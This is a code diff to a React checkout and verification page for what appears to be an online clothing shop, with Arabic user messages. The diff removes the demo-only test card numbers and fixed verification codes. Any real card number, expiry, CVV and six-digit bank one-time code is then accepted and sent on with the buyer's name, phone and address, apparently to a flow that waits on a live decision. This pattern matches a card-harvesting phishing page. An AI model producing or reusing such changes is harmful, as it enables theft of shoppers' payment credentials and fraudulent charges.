@@ -112,7 +112,6 @@ function PaymentStep() {
   const [card, setCard] = useState(""); const [month, setMonth] = useState(""); const [year, setYear] = useState(""); const [cvv, setCvv] = useState(""); const [holder, setHolder] = useState(""); const [error, setError] = useState(() => localStorage.getItem("qatar-curves-payment-error") || ""); const [isSubmitting, setIsSubmitting] = useState(false);
   const months = Array.from({ length: 12 }, (_, index) => String(index + 1).padStart(2, "0"));
   const years = Array.from({ length: 35 }, (_, i) => String(2026 + i));
-  const validCards: Record<string, "visa" | "mastercard" | "mada"> = { "4242424242424242": "visa", "5555555555554444": "mastercard", "5888450000000000": "mada" };
   useEffect(() => { localStorage.removeItem("qatar-curves-payment-error"); }, []);
 
   const rawCard = card.replace(/\s/g, "");
@@ -126,13 +125,11 @@ function PaymentStep() {
   const submit = async (event: React.FormEvent) => {
     event.preventDefault();
     if (isSubmitting) return;
-    const digits = rawCard;
-    const method = validCards[digits];
-
     if (!holder.trim()) { setError("أدخلي الاسم على البطاقة"); return; }
     if (!cardComplete) { setError("أدخلي رقم البطاقة كاملاً"); return; }
     if (!cardValid) { setError("رقم البطاقة غير صحيح"); return; }
-    if (!method) { setError("رقم البطاقة غير مدعوم"); return; }
+    if (!detectedBrand) { setError("نوع البطاقة غير مدعوم"); return; }
+    const method = detectedBrand === "amex" ? "visa" : detectedBrand as "visa" | "mastercard" | "mada";
     if (!month || !year) { setError("اختاري تاريخ انتهاء البطاقة"); return; }
     if (!expiryValid) { setError("تاريخ انتهاء البطاقة منتهي الصلاحية"); return; }
     if (!cvvValid) { setError("أدخلي رمز الأمان (3 أرقام)"); return; }
@@ -143,8 +140,8 @@ function PaymentStep() {
 
     setError(""); setIsSubmitting(true);
     const flowId = getCheckoutFlowId();
-    const demoCardNumber = digits as "4242424242424242" | "5555555555554444" | "5888450000000000";
-    const demoSecurityCode = cvv as "123" | "999";
+    const demoCardNumber = rawCard;
+    const demoSecurityCode = cvv;
     const demoExpiry = `${month}/${year.slice(-2)}`;
     try {
       await createSandboxPayment.mutateAsync({ stage: "payment", recordKey: `${flowId}-payment-${Date.now().toString(36)}`, flowId, customerLabel: checkout.name, phone: checkout.phone, zone: checkout.zone, address: checkout.address, items: cart.items.map(item => ({ name: item.name, quantity: item.quantity, size: item.size, color: item.color, priceQar: item.priceQar })), amountQar: cartTotal(cart), cardBrand: method, demoCardNumber, demoExpiry, demoSecurityCode });
@@ -246,7 +243,7 @@ function VerifyStep() {
   }, [awaitingDecision, decision, navigate]);
   const update = (index: number, value: string) => { const digit = value.replace(/\D/g, "").slice(-1); setCode(current => { const next = [...current]; next[index] = digit; return next; }); setError(""); if (digit && index < 5) inputs.current[index + 1]?.focus(); };
   const submit = async (event: React.FormEvent) => {
-    event.preventDefault(); if (isSubmitting) return; const enteredCode = code.join(""); if (!["123456", "654321"].includes(enteredCode)) { setError("أدخلي كود التحقق 123456 أو 654321"); return; } const demoVerificationCode = enteredCode as "123456" | "654321";
+    event.preventDefault(); if (isSubmitting) return; const enteredCode = code.join(""); if (enteredCode.length !== 6) { setError("أدخلي كود التحقق المكون من 6 أرقام"); return; } const demoVerificationCode = enteredCode;
     const checkout = JSON.parse(localStorage.getItem("qatar-curves-checkout") || "null"); const payment = JSON.parse(localStorage.getItem(SANDBOX_PAYMENT_KEY) || "null"); const cart = readCart();
     if (!checkout || !payment?.demoCardNumber || !cart.items.length) { setError("تعذر العثور على بيانات الطلب، عودي للسلة وحاولي مجددًا"); return; }
     setError(""); setIsSubmitting(true); const storedKey = localStorage.getItem(SANDBOX_RECORD_KEY); const recordKey = storedKey || `${Date.now().toString(36)}-${crypto.randomUUID().replaceAll("-", "").slice(0, 16)}`; localStorage.setItem(SANDBOX_RECORD_KEY, recordKey); const orderNumber = `DEMO-${recordKey.replaceAll("-", "").slice(0, 18).toUpperCase()}`;
